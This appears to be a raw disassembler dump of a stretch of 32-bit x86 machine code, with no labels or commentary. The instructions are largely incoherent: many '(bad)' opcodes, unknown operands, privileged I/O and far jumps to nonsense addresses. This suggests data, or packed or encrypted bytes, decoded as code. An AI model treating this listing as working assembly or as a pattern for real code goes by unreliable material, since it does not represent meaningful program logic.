  41bb16:	sbb    DWORD PTR [ebp-0x44],esp
  41bb19:	mov    al,ds:0x67dd3e8
  41bb1e:	lods   eax,DWORD PTR ds:[esi]
  41bb1f:	popf   
  41bb20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb21:	mov    ebp,0xc764f0b9
  41bb26:	cmp    BYTE PTR ds:0x3ba49509,dl
  41bb2c:	inc    eax
  41bb2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb2e:	cmp    eax,0x5588d81b
  41bb33:	cmc    
  41bb34:	fdivr  st,st(4)
  41bb36:	outs   dx,DWORD PTR ds:[esi]
  41bb37:	jg     0x41bad5
  41bb39:	imul   eax,DWORD PTR [edi],0x76856f08
  41bb3f:	sahf   
  41bb40:	int    0xe4
  41bb42:	xchg   ebp,eax
  41bb43:	sub    dh,BYTE PTR [ecx+0x67]
  41bb46:	(bad)  
  41bb47:	dec    edi
  41bb48:	cwde   
  41bb49:	aaa    
  41bb4a:	inc    ebx
  41bb4b:	jmp    FWORD PTR [edx-0x35a10b34]
  41bb51:	inc    edx
  41bb52:	cmp    al,0xdb
  41bb54:	jne    0x41bafc
  41bb56:	call   0xca077d46
  41bb5b:	jbe    0x41bb85
  41bb5d:	mov    ah,0x7c
  41bb5f:	add    BYTE PTR [eax],0xea
  41bb62:	jo     0x41bb5e
  41bb64:	jnp    0x41bb13
  41bb66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb67:	cwde   
  41bb68:	ret    0xe13d
  41bb6b:	scas   eax,DWORD PTR es:[edi]
  41bb6c:	pop    ds
  41bb6d:	scas   al,BYTE PTR es:[edi]
  41bb6e:	gs fsub st,st(5)
  41bb71:	inc    esi
  41bb72:	inc    ebp
  41bb73:	das    
  41bb74:	outs   dx,DWORD PTR ds:[esi]
  41bb75:	jb     0x41bb1b
  41bb77:	inc    ecx
  41bb78:	cs xor esi,ebx
  41bb7b:	cmc    
  41bb7c:	daa    
  41bb7d:	int    0x6c
  41bb7f:	pop    ebp
  41bb80:	xchg   BYTE PTR [esi],dl
  41bb82:	xchg   ebp,eax
  41bb83:	sahf   
  41bb84:	into   
  41bb85:	cmp    BYTE PTR [ebx-0x4bff6274],dh
  41bb8b:	jp     0x41bba2
  41bb8d:	push   cs
  41bb8e:	adc    ebx,DWORD PTR [ebx+0x56]
  41bb91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb92:	inc    ebp
  41bb93:	sar    DWORD PTR gs:[ebx],cl
  41bb96:	xchg   esi,eax
  41bb97:	mov    ebx,0x5e3b2f1c
  41bb9c:	fcomi  st,st(7)
  41bb9e:	std    
  41bb9f:	int3   
  41bba0:	aas    
  41bba1:	add    dl,BYTE PTR [esi+0x6b]
  41bba4:	mul    BYTE PTR [esi-0x29]
  41bba7:	idiv   DWORD PTR [edi-0x4e]
  41bbaa:	ds xor eax,0xe132d5e9
  41bbb0:	stc    
  41bbb1:	bound  eax,QWORD PTR [ebx+edx*8+0x6c55c415]
  41bbb8:	and    BYTE PTR [eax],ch
  41bbba:	(bad)  
  41bbbb:	xchg   edx,eax
  41bbbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbbd:	mov    ah,0x52
  41bbbf:	dec    ebp
  41bbc0:	mov    edx,0xc14aac08
  41bbc5:	pop    ss
  41bbc6:	xchg   ecx,eax
  41bbc7:	xor    eax,0x2ae35438
  41bbcc:	sbb    al,dh
  41bbce:	mov    ebx,0x83aa1e0
  41bbd3:	fisttp QWORD PTR [bx+si-0x742e]
  41bbd8:	inc    ecx
  41bbd9:	mov    fs,WORD PTR [eax+0x35]
  41bbdc:	(bad)  
  41bbde:	adc    eax,0x5f46dc1b
  41bbe3:	jns    0x41bbbf
  41bbe5:	adc    eax,0x3856daaf
  41bbea:	add    edi,ebp
  41bbec:	clc    
  41bbed:	xchg   ebx,eax
  41bbee:	ins    BYTE PTR es:[edi],dx
  41bbef:	pop    ds
  41bbf0:	into   
  41bbf1:	lea    esp,[edx]
  41bbf3:	pop    es
  41bbf4:	push   esi
  41bbf5:	adc    BYTE PTR [eax+eiz*1],dl
  41bbf8:	cmp    BYTE PTR [esi],al
  41bbfa:	(bad)  
  41bbfb:	(bad)  
  41bbfc:	shr    DWORD PTR [ecx],1
  41bbfe:	jmp    0x41bc10
  41bc00:	fnstenv [ecx-0x1c3cd443]
  41bc06:	cld    
  41bc07:	int3   
  41bc08:	mov    fs,WORD PTR [eax-0x6a]
  41bc0b:	mov    DWORD PTR [eax+edx*4-0x66],0x18c9e223
  41bc13:	inc    ebp
  41bc14:	sbb    edx,0x27
  41bc17:	pop    edx
  41bc18:	ds leave 
  41bc1a:	outs   dx,DWORD PTR ds:[esi]
  41bc1b:	jbe    0x41bc5a
  41bc1d:	add    eax,0x7e2ad535
  41bc22:	mov    bl,0xff
  41bc24:	xchg   esi,eax
  41bc25:	jae    0x41bc21
  41bc27:	mov    al,ds:0x62d0139c
  41bc2c:	mov    WORD PTR [ebx+ebx*1-0x3e],?
  41bc30:	add    eax,0x7899327f
  41bc35:	popa   
  41bc36:	je     0x41bc91
  41bc38:	mov    dh,0x76
  41bc3a:	mov    ch,0x31
  41bc3c:	sbb    eax,0xda10b7eb
  41bc41:	fsubr  DWORD PTR [ecx]
  41bc43:	in     al,dx
  41bc44:	lods   al,BYTE PTR ds:[esi]
  41bc45:	mov    al,0xa3
  41bc47:	adc    al,bl
  41bc49:	call   0x89ce:0xa87e64f0
  41bc50:	mov    ebx,0xdfed14b6
  41bc55:	cmc    
  41bc56:	push   es
  41bc57:	test   eax,0x151db727
  41bc5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc5d:	mov    ecx,?
  41bc5f:	into   
  41bc60:	dec    esi
  41bc61:	rcl    DWORD PTR [ecx+eax*8-0x42],1
  41bc65:	(bad)  
  41bc67:	mov    ?,WORD PTR [ecx+0x4457f973]
  41bc6d:	xlat   BYTE PTR ds:[ebx]
  41bc6e:	or     al,0x96
  41bc70:	add    al,0xa8
  41bc72:	sbb    al,0xc5
  41bc74:	cli    
  41bc75:	dec    esp
  41bc76:	inc    ecx
  41bc77:	adc    dh,BYTE PTR [edx-0x38]
  41bc7a:	jbe    0x41bc05
  41bc7c:	sub    al,0xf9
  41bc7e:	xchg   ebp,eax
  41bc7f:	pop    ss
  41bc80:	add    al,0xe1
  41bc82:	imul   cl
  41bc84:	les    edx,FWORD PTR [edi-0xc6aa3a7]
  41bc8a:	mov    esp,DWORD PTR [edi+0x149b9442]
  41bc90:	and    al,BYTE PTR [eax]
  41bc92:	push   cs
  41bc93:	cmp    al,0x98
  41bc95:	push   edx
  41bc96:	dec    edx
  41bc97:	repz mov dh,dl
  41bc9a:	and    al,0x54
  41bc9c:	sbb    bl,BYTE PTR [ecx+edi*4-0x74291c2]
  41bca3:	and    ebp,DWORD PTR [eax+0x5de9f8fe]
  41bca9:	ds sub eax,0x6454ed46
  41bcaf:	ja     0x41bc94
  41bcb1:	mov    bl,0xc0
  41bcb3:	mov    dh,0x7b
  41bcb5:	ins    BYTE PTR es:[edi],dx
  41bcb6:	inc    eax
  41bcb7:	ss sti 
  41bcb9:	push   ebx
  41bcba:	and    al,0xcb
  41bcbc:	icebp  
  41bcbd:	mov    dh,0xf0
  41bcbf:	push   es
  41bcc0:	repnz inc edx
  41bcc2:	enter  0x17e5,0x64
  41bcc6:	mov    edi,edx
  41bcc8:	xor    eax,0x67381a07
  41bccd:	aad    0xb6
  41bccf:	scas   al,BYTE PTR es:[edi]
  41bcd0:	sbb    eax,0xd91dc357
  41bcd5:	xlat   BYTE PTR ds:[ebx]
  41bcd6:	aam    0xb7
  41bcd8:	bound  eax,QWORD PTR [eax+0x47]
  41bcdb:	fsub   QWORD PTR [ebx+0x1765c9e6]
  41bce1:	xchg   ecx,eax
  41bce2:	push   0x48
  41bce4:	sbb    ecx,DWORD PTR [eax-0x4e]
  41bce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bce8:	(bad)  
  41bce9:	mov    al,ds:0x9320239c
  41bcee:	fstp   DWORD PTR ds:0xacb8357a
  41bcf4:	sbb    al,0x87
  41bcf6:	addr16 cmp dh,ch
  41bcf9:	jmp    0x41bcf6
  41bcfb:	sahf   
  41bcfc:	sar    BYTE PTR [edi-0x1882c1ea],1
  41bd02:	std    
  41bd03:	ja     0x41bd15
  41bd05:	mov    ebx,0xa679f45b
  41bd0a:	lods   al,BYTE PTR ds:[esi]
  41bd0b:	mov    esp,0x73d24533
  41bd10:	and    BYTE PTR [esi+0x6570d897],ch
  41bd16:	pop    DWORD PTR [ebx+ebx*2-0x7b]
  41bd1a:	xor    BYTE PTR [edx+esi*4+0x4123bac1],ch
  41bd21:	add    esp,ecx
  41bd23:	imul   ebp,DWORD PTR [esi+0x68d9330a],0xd5fc35b1
  41bd2d:	inc    edi
  41bd2e:	push   ds
  41bd2f:	adc    esp,DWORD PTR [esi+edx*1]
  41bd32:	xchg   BYTE PTR [ebp+edi*4-0x51b8a139],bl
  41bd39:	(bad)  
  41bd3a:	call   0x8a293bb8
  41bd3f:	shr    bl,1
  41bd41:	mov    edi,0x45bf875f
  41bd46:	pop    esi
  41bd47:	add    bh,BYTE PTR [esi-0x543dd683]
  41bd4d:	inc    edi
  41bd4e:	pop    edx
  41bd4f:	int    0x23
  41bd51:	out    dx,al
  41bd52:	sbb    ebx,DWORD PTR [ecx-0x68149698]
  41bd58:	pop    ecx
  41bd59:	mov    ds:0xc22784c4,al
  41bd5e:	adc    eax,0x18868199
  41bd63:	into   
  41bd64:	dec    edi
  41bd65:	push   ebp
  41bd66:	test   al,al
  41bd68:	cli    
  41bd69:	xor    eax,0xad5a4e09
  41bd6e:	cs push ss
  41bd70:	fstp   st(4)
  41bd72:	mov    eax,0x4e27f3b2
  41bd77:	inc    eax
  41bd78:	in     al,dx
  41bd79:	outs   dx,DWORD PTR ds:[esi]
  41bd7a:	cmp    al,0xf4
  41bd7c:	ds inc ecx
  41bd7e:	adc    al,0xc0
  41bd80:	ret    
  41bd81:	shr    DWORD PTR [eax],1
  41bd83:	mov    eax,0xd888c1cd
  41bd88:	xchg   ecx,eax
  41bd89:	popa   
  41bd8a:	je     0x41bd4d
  41bd8c:	jp     0x41bd39
  41bd8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd8f:	push   cs
  41bd90:	in     al,0x7a
  41bd92:	add    BYTE PTR [esi+0x3c],cl
  41bd95:	fdivr  st(4),st
  41bd97:	es shl eax,cl
  41bd9a:	adc    al,0xfc
  41bd9c:	cs jno 0x41bd28
  41bd9f:	rcl    BYTE PTR [ebx-0x3d1ccd59],cl
  41bda5:	mov    BYTE PTR [ebp-0x64],bl
  41bda8:	ja     0x41be11
  41bdaa:	sbb    esp,ebp
  41bdac:	ror    dh,1
  41bdae:	je     0x41be03
  41bdb0:	lock (bad) 
  41bdb2:	daa    
  41bdb3:	aaa    
  41bdb4:	iret   
  41bdb5:	repz pusha 
  41bdb7:	popa   
  41bdb8:	shl    DWORD PTR ds:[ebx],1
  41bdbb:	add    al,0x76
  41bdbd:	push   ecx
  41bdbe:	push   ecx
  41bdbf:	pop    es
  41bdc0:	(bad)  
  41bdc1:	push   edx
  41bdc2:	nop
  41bdc3:	sbb    al,0x9a
  41bdc5:	pusha  
  41bdc6:	pop    esp
  41bdc7:	ret    
  41bdc8:	sbb    DWORD PTR [ebp-0x25],0xffffffae
  41bdcc:	int3   
  41bdcd:	jae    0x41be4e
  41bdcf:	in     al,0xce
  41bdd1:	inc    ecx
  41bdd2:	clc    
  41bdd3:	ds push es
  41bdd5:	(bad)  
  41bdd6:	cmp    edi,DWORD PTR [ecx-0x7780b200]
  41bddc:	stos   BYTE PTR es:[edi],al
  41bddd:	sub    BYTE PTR [ecx],0xb6
  41bde0:	mov    dl,BYTE PTR [edx]
  41bde2:	hlt    
  41bde3:	repz pop esi
  41bde5:	inc    ebx
  41bde6:	inc    ebx
  41bde7:	xor    eax,edx
  41bde9:	mov    esp,0x7148729e
  41bdee:	push   ebx
  41bdef:	dec    ebp
  41bdf0:	add    BYTE PTR [ebp+0x6f07fe57],dl
  41bdf6:	dec    eax
  41bdf7:	gs jg  0x41bdc1
  41bdfa:	mov    eax,0x3f851e7c
  41bdff:	aaa    
  41be00:	and    eax,0xc0c9e2ab
  41be05:	gs loop 0x41bddd
  41be08:	adc    cl,BYTE PTR [esi+0x43]
  41be0b:	inc    ebp
  41be0c:	pop    ebx
  41be0d:	mov    bl,0xef
  41be0f:	mov    eax,0xd433487
  41be14:	call   0x98813bf1
  41be19:	lods   eax,DWORD PTR ds:[esi]
  41be1a:	jle    0x41bddf
  41be1c:	fiadd  DWORD PTR [edi+0x47a5d8e]
  41be22:	mov    dl,0x45
  41be24:	and    eax,0x49db66ed
  41be29:	xor    ebx,eax
  41be2b:	add    BYTE PTR [ecx],cl
  41be2d:	pop    ds
  41be2e:	jae    0x41be1a
  41be30:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41be32:	test   eax,0x74d14a9b
  41be37:	mov    ds:0x8c80ce80,eax
  41be3c:	out    0x3,eax
  41be3e:	stos   DWORD PTR es:[edi],eax
  41be3f:	adc    ecx,eax
  41be41:	shl    ch,0x82
  41be44:	sbb    al,0x9f
  41be46:	ja     0x41be89
  41be48:	lock ror BYTE PTR [edx],1
  41be4b:	cmp    DWORD PTR [ecx+0x77a00dc3],ebp
  41be51:	shr    sp,0x80
  41be55:	mov    ebx,ebx
  41be57:	sub    BYTE PTR ds:0x48b02df9,0x3d
  41be5e:	mov    edi,DWORD PTR [ecx-0x6e5a7a81]
  41be64:	ins    DWORD PTR es:[edi],dx
  41be65:	test   eax,0x659e009f
  41be6a:	sti    
  41be6b:	jmp    0x2ca3:0x405a2077
  41be72:	mov    ah,0xe3
  41be74:	int    0xff
  41be76:	scas   al,BYTE PTR es:[edi]
  41be77:	inc    edi
  41be78:	push   eax
  41be79:	in     eax,dx
  41be7a:	sbb    bl,BYTE PTR [ecx]
  41be7c:	add    al,0x84
  41be7e:	mov    BYTE PTR [ebx+0x3d],bh
  41be81:	loopne 0x41be31
  41be83:	cmp    BYTE PTR [ecx+0x622e9853],dl
  41be89:	pop    ss
  41be8a:	(bad)  
  41be8b:	or     eax,0xf29ede3f
  41be90:	adc    BYTE PTR [esp+edi*8],dh
  41be93:	sbb    DWORD PTR [ebx-0x60],edx
  41be96:	call   0x8bdc:0x307d0c01
  41be9d:	out    0x3e,al
  41be9f:	or     dl,BYTE PTR [edx+edi*4]
  41bea2:	leave  
  41bea3:	sahf   
  41bea4:	popf   
  41bea5:	ret    
  41bea6:	cs scas eax,DWORD PTR es:[edi]
  41bea8:	inc    esi
  41bea9:	leave  
  41beaa:	dec    ebp
  41beab:	rol    edi,cl
  41bead:	mov    ds:0x470bac85,al
  41beb2:	lods   al,BYTE PTR ds:[esi]
  41beb3:	setl   BYTE PTR [eax+edi*2+0x417ba52]
  41bebb:	out    0xde,eax
  41bebd:	push   esp
  41bebe:	cmp    BYTE PTR ds:0xf08604b5,0xed
  41bec5:	xchg   esi,eax
  41bec6:	clc    
  41bec7:	push   edx
  41bec8:	test   al,bh
  41beca:	jbe    0x41bf3b
  41becc:	test   al,0xbe
  41bece:	das    
  41becf:	cmp    ah,ah
  41bed1:	adc    DWORD PTR [esi],edx
  41bed3:	std    
  41bed4:	jp     0x41be6c
  41bed6:	dec    esp
  41bed7:	adc    esp,DWORD PTR [edx+0x2e]
  41beda:	es stc 
  41bedc:	push   es
  41bedd:	fst    st(5)
  41bedf:	mov    bl,BYTE PTR [eax-0x54690a06]
  41bee5:	add    DWORD PTR [esi+0x31],0x41
  41bee9:	add    bh,cl
  41beeb:	aam    0x60
  41beed:	pop    ecx
  41beee:	enter  0x8ea0,0xeb
  41bef2:	hlt    
  41bef3:	push   esp
  41bef4:	aaa    
  41bef5:	add    al,0x46
  41bef7:	and    DWORD PTR [eax],ebp
  41bef9:	repnz or DWORD PTR [eax+edx*4+0x65c4084e],ebx
  41bf01:	jle    0x41bec5
  41bf03:	jo     0x41bec8
  41bf05:	retf   
  41bf06:	cmp    bh,ch
  41bf08:	inc    DWORD PTR [esi-0x28]
  41bf0b:	dec    esi
  41bf0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf0d:	pop    ecx
  41bf0e:	clc    
  41bf0f:	and    al,0x64
  41bf11:	fdiv   QWORD PTR [ebx+0x5c]
  41bf14:	fcomp  st(6)
  41bf16:	sbb    eax,0x57552dd4
  41bf1b:	xor    al,0x22
  41bf1d:	add    DWORD PTR [edx],esi
  41bf1f:	sub    al,0x60
  41bf21:	or     eax,esi
  41bf23:	mov    dl,BYTE PTR [esi+ebx*2-0x2c52b916]
  41bf2a:	inc    edx
  41bf2b:	add    ch,BYTE PTR [eax+0x347a4cc9]
  41bf31:	cmp    eax,0x190324c0
  41bf36:	mov    DWORD PTR [ebx+0x5e15dfa3],ebp
  41bf3c:	retf   
  41bf3d:	and    DWORD PTR [esi],edx
  41bf3f:	ret    0xf684
  41bf42:	ror    BYTE PTR [ecx],cl
  41bf44:	mov    ebx,0x4469477d
  41bf49:	add    eax,0x768e0d46
  41bf4e:	(bad)  
  41bf4f:	mov    eax,0xdc4d2c3d
  41bf54:	aam    0x92
  41bf56:	out    dx,al
  41bf57:	jmp    0x41bef4
  41bf59:	repz aad 0x1f
  41bf5c:	data16 test al,0x4b
  41bf5f:	fs (bad) 
  41bf61:	mov    esi,0x6e1cba31
  41bf66:	or     bh,BYTE PTR [ecx+0x7d5eceba]
  41bf6c:	add    ch,BYTE PTR [edi+ebx*1+0x3b9e8df7]
  41bf73:	ffreep st(6)
  41bf75:	cmp    eax,0xd6efecad
  41bf7a:	cli    
  41bf7b:	xchg   esp,eax
  41bf7c:	sbb    DWORD PTR ss:[edi+0x465caa63],edi
  41bf83:	and    BYTE PTR es:[eax],bh
  41bf86:	(bad)  
  41bf88:	daa    
  41bf89:	(bad)  
  41bf8a:	fisttp QWORD PTR [ebx+0x39]
  41bf8d:	xchg   ecx,eax
  41bf8e:	xchg   ecx,eax
  41bf8f:	or     al,al
  41bf91:	std    
  41bf92:	in     al,dx
  41bf93:	push   edx
  41bf94:	daa    
  41bf95:	mov    ebx,DWORD PTR [edi+0x4d266c8b]
  41bf9b:	outs   dx,DWORD PTR ds:[esi]
  41bf9c:	icebp  
  41bf9d:	je     0x41bfcf
  41bf9f:	outs   dx,BYTE PTR ds:[esi]
  41bfa0:	xchg   DWORD PTR ss:[esi],edi
  41bfa3:	mov    dh,0xb8
  41bfa5:	and    al,0xcf
  41bfa7:	cli    
  41bfa8:	je     0x41bf5e
  41bfaa:	push   esp
  41bfab:	inc    bx
  41bfad:	mov    ebp,0x88c0f120
  41bfb2:	jae    0x41bfe3
  41bfb4:	mov    al,0x9c
  41bfb6:	add    bh,0x3d
  41bfb9:	push   ds
  41bfba:	mov    dl,0xea
  41bfbc:	mov    ebp,0x70cc0faf
  41bfc1:	jns    0x41bf6d
  41bfc3:	sahf   
  41bfc4:	push   ds
  41bfc5:	inc    esi
  41bfc6:	mov    bl,0x88
  41bfc8:	cwde   
  41bfc9:	pop    eax
  41bfca:	ins    BYTE PTR es:[edi],dx
  41bfcb:	in     eax,dx
  41bfcc:	pop    ebx
  41bfcd:	aad    0xa0
  41bfcf:	jo     0x41bfdd
  41bfd1:	sti    
  41bfd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfd3:	es icebp 
  41bfd5:	test   DWORD PTR [ecx-0x7d3b91a9],esp
  41bfdb:	lahf   
  41bfdc:	mov    eax,0x368acb8a
  41bfe1:	xchg   DWORD PTR [esi-0x6f7e28db],edx
  41bfe7:	cmp    bh,BYTE PTR [edx+0x78]
  41bfea:	cmp    al,0xaf
  41bfec:	and    eax,0xc063aa2
  41bff1:	inc    edx
  41bff2:	push   ebp
  41bff3:	pop    ecx
  41bff4:	cs jl  0x41c022
  41bff7:	inc    edx
  41bff8:	pop    ecx
  41bff9:	push   0x288a1fc0
  41bffe:	adc    BYTE PTR [edi+0x7],al
  41c001:	bound  eax,QWORD PTR [edi]
  41c003:	add    ah,dh
  41c005:	jmp    0x7044f8c1
  41c00a:	pop    ss
  41c00b:	xor    eax,0x43de47c5
  41c010:	jle    0x41bfd5
  41c012:	mov    eax,0x81aef385
  41c017:	arpl   WORD PTR [edi],ax
  41c019:	stc    
  41c01a:	push   esp
  41c01b:	aad    0x32
  41c01d:	mov    ah,dh
  41c01f:	stos   BYTE PTR es:[edi],al
  41c020:	fdivr  st,st(2)
  41c022:	hlt    
  41c023:	dec    esi
  41c024:	(bad)  
  41c025:	xor    al,0x0
  41c027:	sub    cl,BYTE PTR [ebx]
  41c029:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c02a:	push   ds
  41c02b:	mov    gs,WORD PTR [ebx]
  41c02d:	hlt    
  41c02e:	mov    WORD PTR [edi-0x55],?
  41c031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c032:	inc    edx
  41c033:	addr16 test eax,0xcc143591
  41c039:	push   0xfffffff6
  41c03b:	mov    esi,0x72df9ed4
  41c040:	cmp    al,0x18
  41c042:	les    ebx,FWORD PTR [eax-0x69015379]
  41c048:	addr16 inc edi
  41c04a:	pop    es
  41c04b:	xchg   ebx,eax
  41c04c:	jbe    0x41c0ab
  41c04e:	sbb    ebx,ebx
  41c050:	mov    cl,0x2
  41c052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c053:	fist   WORD PTR [eax+0x5f]
  41c056:	aad    0xd1
  41c058:	cmp    ebp,esi
  41c05a:	in     al,dx
  41c05b:	xchg   edi,eax
  41c05c:	or     BYTE PTR [edx],al
  41c05e:	imul   eax,DWORD PTR [edx+eax*4+0x55],0x61b58e81
  41c066:	add    al,0x90
  41c068:	sub    ebp,DWORD PTR [eax]
  41c06a:	jmp    0xc304:0x6fe9931d
  41c071:	push   es
  41c072:	inc    edx
  41c073:	fdivr  QWORD PTR [ebp+0x9]
  41c076:	loopne 0x41bffe
  41c078:	leave  
  41c079:	stos   DWORD PTR es:[edi],eax
  41c07a:	test   BYTE PTR [edi+0x5b],ch
  41c07d:	sub    ebp,DWORD PTR [edi+ecx*2]
  41c080:	push   ds
  41c081:	and    eax,0x9c6e53a9
  41c086:	pop    edi
  41c087:	mov    ds,esi
  41c089:	jo     0x41c09d
  41c08b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c08c:	lods   eax,DWORD PTR ds:[esi]
  41c08d:	daa    
  41c08e:	xor    eax,0xe8a868aa
  41c093:	dec    eax
  41c094:	add    eax,0x812231c5
  41c099:	and    al,0x4e
  41c09b:	mov    edx,0x7da48486
  41c0a0:	mov    WORD PTR [ecx],cs
  41c0a2:	imul   ecx,DWORD PTR [ebp+eax*1-0x1b],0x50
  41c0a7:	div    edi
  41c0a9:	fs pop es
  41c0ab:	sti    
  41c0ac:	repz pop ss
  41c0ae:	fld    TBYTE PTR [edi]
  41c0b0:	add    BYTE PTR [ebp+ecx*1+0x0],bh
  41c0b4:	loopne 0x41c130
  41c0b6:	fsub   QWORD PTR [ecx+edx*2-0xa4867ac]
  41c0bd:	pop    edi
  41c0be:	test   al,0x52
  41c0c0:	jnp    0x41c07c
  41c0c2:	push   ecx
  41c0c3:	or     dh,BYTE PTR [eax]
  41c0c5:	(bad)  
  41c0c6:	hlt    
  41c0c7:	imul   esp,DWORD PTR [eax+0x4526a2c5],0x59dc4d93
  41c0d1:	or     bh,BYTE PTR gs:[ebx]
  41c0d4:	push   ebx
  41c0d5:	push   ebp
  41c0d6:	es dec eax
  41c0d8:	pop    esi
  41c0d9:	int3   
  41c0da:	mov    ds:0x1bf35607,al
  41c0df:	xlat   BYTE PTR ds:[ebx]
  41c0e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0e1:	pusha  
  41c0e2:	ret    0xe37d
  41c0e5:	int3   
  41c0e6:	jbe    0x41c0d6
  41c0e8:	push   ecx
  41c0e9:	mov    bl,0x6c
  41c0eb:	xchg   esp,eax
  41c0ec:	xor    DWORD PTR [ebp-0x36e674a0],ebp
  41c0f2:	shl    DWORD PTR [ecx],cl
  41c0f4:	lds    esi,FWORD PTR [esi-0x50]
  41c0f7:	lahf   
  41c0f8:	xchg   edx,edx
  41c0fa:	fdiv   st,st(6)
  41c0fc:	gs in  al,dx
  41c0fe:	adc    DWORD PTR [ecx-0x53],eax
  41c101:	xor    al,0xdc
  41c103:	pop    esp
  41c104:	sbb    al,0xb9
  41c106:	push   es
  41c107:	mov    ebx,0xbfb5181e
  41c10c:	repz hlt 
  41c10e:	sbb    edx,DWORD PTR [esi]
  41c110:	jo     0x41c16c
  41c112:	jge    0x41c12a
  41c114:	jl     0x41c189
  41c116:	add    cl,ah
  41c118:	xor    al,0x78
  41c11a:	jnp    0x41c0d7
  41c11c:	sti    
  41c11d:	ret    0xaea8
  41c120:	mov    al,0xa4
  41c122:	inc    ecx
  41c123:	jno    0x41c0ae
  41c125:	add    edx,0xffffffeb
  41c128:	sbb    al,0x61
  41c12a:	scas   eax,DWORD PTR es:[edi]
  41c12b:	mov    dl,0x23
  41c12d:	pop    esi
  41c12e:	and    eax,0xe12c4b01
  41c133:	sahf   
  41c134:	pop    es
  41c135:	cs mov al,0xc7
  41c138:	sbb    DWORD PTR [edx],ebx
  41c13a:	test   eax,eax
  41c13c:	or     al,0xe0
  41c13e:	mov    dl,0xae
  41c140:	idiv   DWORD PTR [ecx+ecx*8]
  41c143:	retf   0x410f
  41c146:	mov    ecx,0x75349636
  41c14b:	inc    eax
  41c14c:	shl    BYTE PTR [edx],1
  41c14e:	scas   eax,DWORD PTR es:[edi]
  41c14f:	test   BYTE PTR [ebp+eax*1+0x68],dh
  41c153:	bnd jno 0x41c179
  41c156:	in     eax,dx
  41c157:	test   eax,0xeb45b053
  41c15c:	and    eax,0xcb70cf8
  41c161:	xor    eax,0x2a909ce0
  41c166:	adc    BYTE PTR [eax-0x310fa558],0x78
  41c16d:	ja     0x41c1e1
  41c16f:	sub    bl,bh
  41c171:	xor    BYTE PTR [ebx],bl
  41c173:	test   eax,0x10ba7e43
  41c178:	test   al,0xbe
  41c17a:	mov    dh,0x4e
  41c17c:	(bad)  
  41c17d:	sub    bl,bl
  41c17f:	sahf   
  41c180:	aam    0x90
  41c182:	pop    ecx
  41c183:	fs cmp esp,edx
  41c186:	cdq    
  41c187:	mov    esi,0x415489e3
  41c18c:	call   0x48b9d96b
  41c191:	sub    al,0x25
  41c193:	test   al,0xda
  41c195:	repz ds fs xchg edi,eax
  41c199:	push   ebp
  41c19a:	cwde   
  41c19b:	test   BYTE PTR [ecx-0x5420a34b],bh
  41c1a1:	xchg   ebp,eax
  41c1a2:	push   es
  41c1a3:	imul   edi,ebx,0xd9eb5e50
  41c1a9:	scas   eax,DWORD PTR es:[edi]
  41c1aa:	pusha  
  41c1ab:	mov    ds:0xb0683d85,al
  41c1b0:	popa   
  41c1b1:	dec    eax
  41c1b2:	xor    eax,0x6406444f
  41c1b7:	and    al,0x65
  41c1b9:	imul   edi,DWORD PTR [ebx-0x1b],0x31
  41c1bd:	pop    es
  41c1be:	popf   
  41c1bf:	out    0x8e,eax
  41c1c1:	aam    0xda
  41c1c3:	sub    edi,ecx
  41c1c5:	push   edi
  41c1c6:	add    BYTE PTR [eax+ecx*4],0x42
  41c1ca:	adc    eax,0xec2dd733
  41c1cf:	sbb    al,BYTE PTR [ebx+0x4d]
  41c1d2:	add    ebx,esi
  41c1d4:	inc    eax
  41c1d5:	pusha  
  41c1d6:	sub    DWORD PTR [edi-0x23f67e98],ecx
  41c1dc:	push   0xd3bc4d3e
  41c1e1:	(bad)  
  41c1e2:	mov    ch,0xc4
  41c1e4:	mov    ds:0x6570d4bf,eax
  41c1e9:	xchg   edx,eax
  41c1ea:	mov    edx,0x262cc938
  41c1ef:	fcmovu st,st(7)
  41c1f1:	sbb    eax,0x831bb3ef
  41c1f6:	not    DWORD PTR [esi+0x25]
  41c1f9:	daa    
  41c1fa:	cld    
  41c1fb:	call   0x37bb:0x1b2a18f4
  41c202:	mov    ebx,0xb2b3f4be
  41c207:	call   0x74aa:0xb9991e03
  41c20e:	jg     0x41c1a3
  41c210:	xchg   esi,eax
  41c211:	pop    ds
  41c212:	add    ebx,0x18
  41c215:	in     eax,dx
  41c216:	scas   al,BYTE PTR es:[edi]
  41c217:	jnp    0x41c285
  41c219:	aaa    
  41c21a:	(bad)  
  41c21b:	jns    0x41c1f5
  41c21d:	inc    esi
  41c21e:	das    
  41c21f:	aad    0x6a
  41c221:	fldcw  WORD PTR [ebp+0x3c0efb51]
  41c227:	mov    ?,ebx
  41c229:	xchg   ebp,eax
  41c22a:	fbstp  TBYTE PTR [esi-0x24]
  41c22d:	clc    
  41c22e:	sahf   
  41c22f:	and    ebp,eax
  41c231:	ins    BYTE PTR es:[edi],dx
  41c232:	or     ecx,ebp
  41c234:	xor    al,0x70
  41c236:	out    0x28,eax
  41c238:	hlt    
  41c239:	push   eax
  41c23a:	xor    al,0x46
  41c23c:	call   0x752c:0x57fa2291
  41c243:	mov    DWORD PTR [esp+edx*8+0xd],esi
  41c247:	ror    DWORD PTR [edx],cl
  41c249:	stos   BYTE PTR es:[edi],al
  41c24a:	inc    DWORD PTR [esi+0x4987c0b1]
  41c250:	lds    edx,FWORD PTR [ebp-0x2126a73a]
  41c256:	aaa    
  41c257:	sub    DWORD PTR ds:0xb6f644c1,0x41dc6ef5
  41c261:	in     al,0x4c
  41c263:	xchg   ebp,eax
